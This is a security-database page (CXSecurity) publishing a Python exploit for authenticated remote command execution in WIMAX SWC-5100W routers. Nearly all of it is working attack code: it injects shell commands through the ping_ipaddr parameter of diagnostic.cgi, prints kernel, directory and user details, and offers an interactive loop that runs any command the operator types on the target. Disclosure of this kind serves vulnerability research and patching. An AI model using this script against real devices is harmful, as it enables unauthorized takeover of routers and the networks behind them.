---
title: WIMAX SWC-5100W Remote Command Execution
url: https://cxsecurity.com/issue/WLB-2023040028
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-07
fetch_date: 2025-10-04T11:29:09.297940
---

# WIMAX SWC-5100W Remote Command Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WIMAX SWC-5100W Remote Command Execution** **2023.04.06**  Credit:  **[Momen Eldawakhly](https://cxsecurity.com/author/Momen%2BEldawakhly/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

# Exploit Title: WIMAX SWC-5100W Firmware V(1.11.0.1 :1.9.9.4) - Authenticated RCE
# Vulnerability Name: Ballin' Mada
# Date: 4/3/2023
# Exploit Author: Momen Eldawakhly (Cyber Guy)
# Vendor Homepage: http://www.seowonintech.co.kr/eng/main
# Version: Bootloader(1.18.19.0) , HW (0.0.7.0), FW(1.11.0.1 : 1.9.9.4)
# Tested on: Unix
# CVE : Under registration
import requests
import random,argparse
import sys
from colorama import Fore
from bs4 import BeautifulSoup
red = Fore.RED
green = Fore.GREEN
cyan = Fore.CYAN
yellow = Fore.YELLOW
reset = Fore.RESET
argParser = argparse.ArgumentParser()
argParser.add\_argument("-t", "--target", help="Target router")
argParser.add\_argument("-rv", "--reverseShell", help="Obtain reverse shell", action='store\_true')
argParser.add\_argument("-tx", "--testExploit", help="Test exploitability", action='store\_true')
args = argParser.parse\_args()
target = args.target
rev = args.reverseShell
testX = args.testExploit
banner = """
\_\_\_\_ \_\_\_\_ \_\_\_\_ \_\_\_\_ \_\_\_\_ \_\_\_\_ \_\_\_\_ \_\_\_\_\_\_\_\_\_ \_\_\_\_ \_\_\_\_ \_\_\_\_ \_\_\_\_
||B |||a |||l |||l |||i |||n |||' ||| |||M |||a |||d |||a ||
||\_\_|||\_\_|||\_\_|||\_\_|||\_\_|||\_\_|||\_\_|||\_\_\_\_\_\_\_|||\_\_|||\_\_|||\_\_|||\_\_||
|/\_\_\|/\_\_\|/\_\_\|/\_\_\|/\_\_\|/\_\_\|/\_\_\|/\_\_\_\_\_\_\_\|/\_\_\|/\_\_\|/\_\_\|/\_\_\|
RCE 0day in WIMAX SWC-5100W
[ Spell the CGI as in Cyber Guy ]
"""
def checkEXP():
print(cyan + "[+] Checking if target is vulnerable" + reset)
art = ['PWNED\_1EE7', 'CGI AS IN CYBER GUY']
request = requests.get(url = f"http://{target}/cgi-bin/diagnostic.cgi?action=Apply&html\_view=ping&ping\_count=10&ping\_ipaddr=;echo 'PUTS("+random.choice(art)+")';", proxies=None)
if request.status\_code == 200:
print(green + "[+] Status code: 200 success" + reset)
soup = BeautifulSoup(request.text, 'html.parser')
if soup.get\_text(" ").find("PWNED\_1EE7") < 0 or soup.get\_text(" ").find("CGI AS IN CYBER GUY"):
print(green + "[+] Target is vulnerable" + reset)
uname = requests.get(url = f"http://{target}/cgi-bin/diagnostic.cgi?action=Apply&html\_view=ping&ping\_count=10&ping\_ipaddr=;echo+\"<a+id='pwned'>[\*] Kernel: `uname+-a` -=-=- [\*] Current directory: `pwd` -=-=- [\*] User: `whoami`</a>\";")
soup\_validate = BeautifulSoup(uname.text, 'html.parser')
print(soup\_validate.find(id="pwned").text)
else:
print(red + "[+] Seems to be not vulnerable" + reset)
else:
print(red + "[+] Status code: " + str(request.status\_code) + reset)
def revShell():
cmd = input("CGI #:- ")
while cmd:
try:
print(cmd)
uname = requests.get(url = f"http://{target}/cgi-bin/diagnostic.cgi?action=Apply&html\_view=ping&ping\_count=10&ping\_ipaddr=;echo+\"<a+id='result'>`{cmd}`</a>\";")
resp = BeautifulSoup(uname.text, 'html.parser')
print(resp.find(id="result").text)
if cmd == "exit" or cmd == "quit":
print(yellow + "[\*] Terminating ..." + reset)
sys.exit(0)
else:
return revShell()
except KeyboardInterrupt:
sys.exit(0)
def help():
print(
"""
[+] Example: python3 pwnMada.py -t 192.168.1.1 -rv
[\*] -t, --target :: Specify target to attack.
[\*] -rv, --reverseShell :: Obtain reverse shell.
[\*] -tx, --testExploit :: Test the exploitability of the target.
[\*] -fz, --fuzz :: Fuzz the target with arbitrary chars.
"""
)
if target and rev:
print(banner)
revShell()
elif target and testX:
print(banner)
checkEXP()
else:
print(banner)
argParser.print\_help()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040028)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top